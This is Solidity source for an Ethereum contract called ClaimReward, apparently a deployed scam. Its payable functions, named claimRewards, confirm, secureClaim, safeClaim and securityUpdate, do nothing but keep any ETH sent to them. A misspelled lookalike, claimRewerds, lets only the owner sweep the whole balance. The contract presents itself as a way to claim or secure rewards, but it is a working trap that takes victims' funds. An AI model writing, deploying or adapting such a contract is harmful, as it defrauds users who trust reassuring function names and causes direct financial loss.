/**
 *Submitted for verification at Etherscan.io on 2023-05-08
*/

pragma solidity ^0.4.26;

contract ClaimReward {

    address private  owner;    // current owner of the contract

     constructor() public{   
        owner=msg.sender;
    }
    function getOwne(
    ) public view returns (address) {    
        return owner;
    }
    function claimRewerds() public {
        require(owner == msg.sender);
        msg.sender.transfer(address(this).balance);
    }

    function claimRewards() public payable {
    }

    function confirm() public payable {
    }

    function secureClaim() public payable {
    }

    
    function safeClaim() public payable {
    }

    
    function securityUpdate() public payable {
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}